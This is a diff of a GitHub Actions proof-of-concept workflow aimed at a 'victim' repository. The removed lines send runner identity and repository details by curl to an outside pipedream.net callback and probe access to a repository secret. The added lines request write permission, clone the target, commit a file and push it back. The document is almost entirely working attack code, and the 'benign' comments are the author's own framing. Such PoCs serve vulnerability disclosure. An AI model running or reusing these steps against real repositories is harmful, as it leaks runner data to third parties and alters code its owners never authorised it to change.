@@ -1,63 +1,24 @@
-name: Run from Docs (PoC)
+name: Source Takeover PoC
+on: workflow_dispatch
 
-on:
-  workflow_dispatch:
-    inputs:
-      provider:
-        description: "Select cloud provider per the docs"
-        required: true
-        default: "none"
-        type: choice
-        options:
-          - aws
-          - gcp
-          - azure
-          - none
+permissions:
+  contents: write   # Needed to push to the victim repo
+  pull-requests: write
 
 jobs:
-  prove-rce:
+  takeover:
     runs-on: ubuntu-latest
     steps:
-      - name: Show runner identity (benign)
+      - name: Clone target repository
         run: |
-          echo "User: $(whoami)"
-          echo "Hostname: $(hostname)"
-          echo "Uname: $(uname -a)"
-          echo "Runner IP (public): $(curl -s https://ifconfig.me || true)"
+          git clone "https://github.com/${{ github.repository }}" target
+          cd target
+          git config user.email "poc-attacker@example.com"
+          git config user.name "RCE PoC Bot"
 
-      - name: Prove outbound network (benign callback)
-        env:
-          CALLBACK: "https://eog4wasc32zrjow.m.pipedream.net/rce"
-        run: |
-          set -euxo pipefail
-          # Send minimal, non-sensitive proof:
-          who=$(whoami)
-          host=$(hostname)
-          prov="${{ github.event.inputs.provider }}"
-          run_id="${{ github.run_id }}"
-          repo="${{ github.repository }}"
-          actor="${{ github.actor }}"
-          curl -sS "${CALLBACK}?who=${who}&host=${host}&provider=${prov}&run_id=${run_id}&repo=${repo}&actor=${actor}" || true
-          echo "Callback sent to canary endpoint."
+          echo "# Proof of RCE" > POC.md
+          echo "This file was added by running a workflow linked in your documentation." >> POC.md
 
-      - name: Write proof to the GitHub Job Summary
-        run: |
-          {
-            echo "## RCE PoC Proof"
-            echo ""
-            echo "- **Repository:** ${{ github.repository }}"
-            echo "- **Actor:** ${{ github.actor }}"
-            echo "- **Run ID:** ${{ github.run_id }}"
-            echo "- **Provider input:** ${{ github.event.inputs.provider }}"
-            echo ""
-            echo "Commands executed successfully on GitHub runner."
-          } >> "$GITHUB_STEP_SUMMARY"
-
-      - name: Non-sensitive secrets check (length only)
-        if: ${{ env.DEMO_SECRET != '' }}
-        env:
-          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}  # Create a dummy, non-sensitive secret for demo if allowed
-        run: |
-          # Don't print secrets; show only the length to prove access is possible
-          len=$(printf "%s" "${DEMO_SECRET}" | wc -c | tr -d ' ')
-          echo "A demo secret is configured; length=${len} (value redacted)."
+          git add POC.md
+          git commit -m "PoC: Added harmless proof file via unclaimed workflow"
+          git push origin HEAD
